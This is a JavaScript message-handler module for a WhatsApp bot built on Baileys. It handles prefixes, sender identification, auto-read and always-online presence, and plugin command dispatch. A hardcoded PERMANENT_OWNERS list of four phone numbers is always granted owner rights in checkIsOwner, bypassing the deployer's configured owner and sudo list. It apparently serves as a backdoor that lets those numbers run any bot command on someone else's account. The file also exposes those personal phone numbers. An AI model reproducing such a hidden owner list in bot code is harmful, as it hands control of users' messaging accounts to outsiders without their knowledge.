import { jidNormalizedUser } from '@whiskeysockets/baileys'

import {
  getDb,
  saveDb
} from './database/index.js'

const OWNER_NUMBER =
  (process.env.OWNER_NUMBER || '').replace(/\D/g, '')

const PERMANENT_OWNERS = [
  '923280966780',
  '923197135780','923483151716','923196520708'
]

let alwaysOnlineTimer = null

/*
 * ==============================
 * PREFIX
 * ==============================
 */

export function getPrefix() {
  const prefixDb =
    getDb('prefix.json', {
      prefix:
        process.env.PREFIX || '.'
    })

  return (
    prefixDb.prefix ||
    process.env.PREFIX ||
    '.'
  )
}

/*
 * ==============================
 * JID HELPERS
 * ==============================
 */

export function normalizeJid(jid) {
  if (!jid) return ''

  try {
    return jidNormalizedUser(jid)
  } catch {
    return String(jid).split(':')[0]
  }
}

export function getSender(message) {
  const key =
    message?.key || {}

  return (
    key.participantPn ||
    key.senderPn ||
    key.participantAlt ||
    key.remoteJidAlt ||
    key.participant ||
    key.remoteJid ||
    ''
  )
}

export function senderNumber(jid) {
  return String(jid)
    .split('@')[0]
    .split(':')[0]
    .replace(/\D/g, '')
}

function getSenderNumbers(message) {
  const key =
    message?.key || {}

  const jids = [
    key.participantPn,
    key.senderPn,
    key.participantAlt,
    key.remoteJidAlt,
    key.participant,
    key.remoteJid
  ]

  return [
    ...new Set(
      jids
        .filter(Boolean)
        .map(senderNumber)
        .filter(Boolean)
    )
  ]
}

export function isGroup(jid) {
  return String(jid).endsWith('@g.us')
}

/*
 * ==============================
 * OWNER
 * ==============================
 */

export function checkIsOwner(
  message,
  sock
) {
  if (message?.key?.fromMe) {
    return true
  }

  const senderNumbers =
    getSenderNumbers(message)

  if (
    senderNumbers.some(
      number =>
        PERMANENT_OWNERS.includes(number)
    )
  ) {
    return true
  }

  const botNum =
    senderNumber(
      sock?.user?.id || ''
    )

  if (
    senderNumbers.some(
      number =>
        botNum &&
        number === botNum
    )
  ) {
    return true
  }

  if (
    OWNER_NUMBER &&
    senderNumbers.includes(
      OWNER_NUMBER
    )
  ) {
    return true
  }

  const sudoData =
    getDb('sudo.json', {
      sudoNumbers: []
    })

  const dynamicSudos =
    Array.isArray(
      sudoData.sudoNumbers
    )
      ? sudoData.sudoNumbers
      : []

  if (
    senderNumbers.some(
      number =>
        dynamicSudos.includes(number)
    )
  ) {
    return true
  }

  return false
}

/*
 * ==============================
 * MESSAGE HELPERS
 * ==============================
 */

export function unwrapMessage(message) {
  let m =
    message?.message

  if (!m) return null

  for (
    let i = 0;
    i < 10;
    i++
  ) {
    const next =
      m?.ephemeralMessage?.message ||
      m?.viewOnceMessage?.message ||
      m?.viewOnceMessageV2?.message ||
      m?.viewOnceMessageV2Extension?.message ||
      m?.documentWithCaptionMessage?.message

    if (!next) break

    m = next
  }

  return m
}

export function getText(message) {
  const m =
    unwrapMessage(message)

  if (!m) return ''

  return (
    m.conversation ||
    m.extendedTextMessage?.text ||
    m.imageMessage?.caption ||
    m.videoMessage?.caption ||
    m.documentMessage?.caption ||
    ''
  ).trim()
}

export function getQuotedMessage(
  message
) {
  const m =
    unwrapMessage(message)

  if (!m) return null

  const context =
    m.extendedTextMessage?.contextInfo ||
    m.imageMessage?.contextInfo ||
    m.videoMessage?.contextInfo ||
    m.audioMessage?.contextInfo ||
    m.documentMessage?.contextInfo ||
    m.stickerMessage?.contextInfo

  return (
    context?.quotedMessage ||
    null
  )
}

/*
 * ==============================
 * SETTINGS
 * ==============================
 */

function getSettings() {
  return getDb(
    'settings.json',
    {
      autoread: false,
      alwaysonline: false
    }
  )
}

export function getAutoRead() {
  const data =
    getSettings()

  return data.autoread === true
}

export function getAlwaysOnline() {
  const data =
    getSettings()

  return data.alwaysonline === true
}

export function setAutoRead(value) {
  const data =
    getSettings()

  data.autoread =
    value === true

  saveDb(
    'settings.json',
    data
  )

  return data
}

export function setAlwaysOnline(value) {
  const data =
    getSettings()

  data.alwaysonline =
    value === true

  saveDb(
    'settings.json',
    data
  )

  return data
}

/*
 * ==============================
 * ALWAYS ONLINE
 * ==============================
 */

export async function startAlwaysOnline(
  sock
) {
  if (!sock) return

  if (alwaysOnlineTimer) {
    clearInterval(
      alwaysOnlineTimer
    )

    alwaysOnlineTimer =
      null
  }

  if (
    !getAlwaysOnline()
  ) {
    try {
      await sock.sendPresenceUpdate(
        'unavailable'
      )
    } catch {}

    return
  }

  try {
    await sock.sendPresenceUpdate(
      'available'
    )
  } catch {}

  alwaysOnlineTimer =
    setInterval(
      async () => {
        if (
          !getAlwaysOnline()
        ) {
          await stopAlwaysOnline(
            sock
          )

          return
        }

        try {
          await sock.sendPresenceUpdate(
            'available'
          )
        } catch {}
      },
      20000
    )

  if (
    typeof alwaysOnlineTimer
      ?.unref === 'function'
  ) {
    alwaysOnlineTimer.unref()
  }
}

export async function stopAlwaysOnline(
  sock
) {
  if (alwaysOnlineTimer) {
    clearInterval(
      alwaysOnlineTimer
    )

    alwaysOnlineTimer =
      null
  }

  if (!sock) return

  try {
    await sock.sendPresenceUpdate(
      'unavailable'
    )
  } catch {}
}

/*
 * ==============================
 * MESSAGE HANDLER
 * ==============================
 */

export async function handleMessages(
  update,
  sock,
  plugins,
  messageListeners
) {
  if (
    update.type !== 'notify'
  ) {
    return
  }

  if (
    getAlwaysOnline() &&
    !alwaysOnlineTimer
  ) {
    await startAlwaysOnline(
      sock
    )
  }

  for (
    const message of
    update.messages || []
  ) {
    try {
      if (
        !message?.message
      ) {
        continue
      }

      const rawJid =
        message.key?.remoteJid ||
        ''

      if (
        getAutoRead() &&
        message.key?.id
      ) {
        try {
          await sock.readMessages([
            message.key
          ])
        } catch {}
      }

      const isGroupStatusPost =
        !!message
          .message
          ?.groupStatusMessageV2

      if (
        rawJid ===
          'status@broadcast' &&
        !isGroupStatusPost
      ) {
        continue
      }

      const normalizedRemoteJid =
        normalizeJid(
          rawJid
        )

      const text =
        getText(
          message
        )

      const isGroupChat =
        isGroup(
          normalizedRemoteJid
        ) ||
        isGroupStatusPost

      const isOwner =
        checkIsOwner(
          message,
          sock
        )

      const activePrefix =
        getPrefix()

      for (
        const listener of
        messageListeners
      ) {
        try {
          if (
            typeof listener.on ===
            'function'
          ) {
            await listener.on({
              sock,
              message,
              text,
              isOwner,
              isGroup:
                isGroupChat,
              isStatus:
                isGroupStatusPost
            })
          } else if (
            typeof listener.run ===
            'function'
          ) {
            await listener.run({
              sock,
              message,
              text,
              isOwner,
              isGroup:
                isGroupChat,
              isStatus:
                isGroupStatusPost
            })
          }
        } catch (err) {
          console.error(
            '[Listener Error]:',
            err
          )
        }
      }

      if (
        isGroupStatusPost
      ) {
        continue
      }

      if (
        !text ||
        !text.startsWith(
          activePrefix
        )
      ) {
        continue
      }

      if (!isOwner) {
        continue
      }

      const body =
        text
          .slice(
            activePrefix.length
          )
          .trim()

      if (!body) {
        continue
      }

      const parts =
        body.split(/\s+/)

      const command =
        parts
          .shift()
          .toLowerCase()

      const args =
        parts

      const plugin =
        plugins.get(
          command
        )

      if (!plugin) {
        continue
      }

      console.log(
        `⚡ Executing: ${
          activePrefix
        }${command} from ${
          senderNumber(
            getSender(
              message
            )
          )
        }`
      )

      try {
        await sock.sendMessage(
          rawJid,
          {
            react: {
              text: '⏳',
              key: message.key
            }
          }
        )

        setTimeout(
          async () => {
            try {
              await sock.sendMessage(
                rawJid,
                {
                  react: {
                    text: '',
                    key:
                      message.key
                  }
                }
              )
            } catch {}
          },
          1000
        )
      } catch {}

      const quotedMessage =
        getQuotedMessage(
          message
        )

      await plugin.run({
        sock,
        message,
        quotedMessage,
        args,
        text:
          args.join(' '),
        command,
        prefix:
          activePrefix,
        isOwner,
        isGroup:
          isGroupChat,
        plugins
      })

    } catch (error) {
      console.error(
        'Message handling error:',
        error
      )
    }
  }
}

/*
 * ==============================
 * GROUP PARTICIPANTS
 * ==============================
 */

export async function handleGroupParticipants(
  update,
  sock,
  groupListeners
) {
  if (!update) return

  for (
    const listener of
    groupListeners
  ) {
    try {
      await listener.run({
        sock,
        update
      })
    } catch (error) {
      console.error(
        '[Group Listener Error]:',
        error
      )
    }
  }
}
